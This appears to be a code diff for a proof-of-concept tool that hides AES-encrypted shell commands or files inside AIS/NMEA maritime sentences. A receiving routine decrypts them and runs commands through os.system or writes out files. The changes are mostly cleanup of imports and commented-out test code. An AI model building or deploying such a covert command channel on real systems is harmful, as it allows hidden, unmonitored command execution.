@@ -1,6 +1,4 @@
-from pickle import GLOBAL
 from pyais.encode import encode_dict
-from rsa import decrypt
 from NMEA import NMEA
 import os
 from Crypto.Cipher import AES
@@ -87,7 +85,7 @@ def decrypt_and_decode(payloads):
         if trigger_received and sentence_count == 0:
             received_cipher = bytes.fromhex(received_cipher)
             plaintext = decrypt_cipher.decrypt(received_cipher)
-            print(plaintext)
+            print(f"[*] Payload decrypted and decoded.......{plaintext}")
             if option == "CMD":
                 os.system(plaintext.decode())
             if option == "FILE":
@@ -103,10 +101,6 @@ def decrypt_and_decode(payloads):
                 trigger_received = True
                 if option == "FILE":   
                     filename = data[3]
-
-                
-
-
 
 def main():
     global OPTION
@@ -124,8 +118,6 @@ def main():
         data = file_open(FILE_NAME)
         print(f"[*] Received {OPTION}: {FILE_NAME}")
     
-    # OPTION = "CMD"
-    # data = b"ls"
 
     hidden_cc = encrypt(data)
     print(f"[*] AES Encypted payload {hidden_cc}")
@@ -135,28 +127,8 @@ def main():
         print(payload)
 
     print()
-    decrypt_and_decode(payloads)
+    #decrypt_and_decode(payloads)
 
 
 if __name__ == "__main__":
     main()
-
-# decrypt_cipher = AES.new(key, AES.MODE_EAX, nonce = key)
-# plaintext = ""
-# received_cipher = ""
-
-# for payload in payload_chunks:
-#     obj = NMEA(sentence = payload)
-#     obj.decode()
-#     received_cipher += obj.data['data'].decode()
-
-# print(received_cipher)
-
-# received_cipher = bytes.fromhex(received_cipher)
-
-# plaintext = decrypt_cipher.decrypt(received_cipher)
-# print(plaintext)
-# out = open('out.py','w')
-# out.write(plaintext.decode())
-# print(plaintext)
-# #os.system(obj.data['data'].decode())
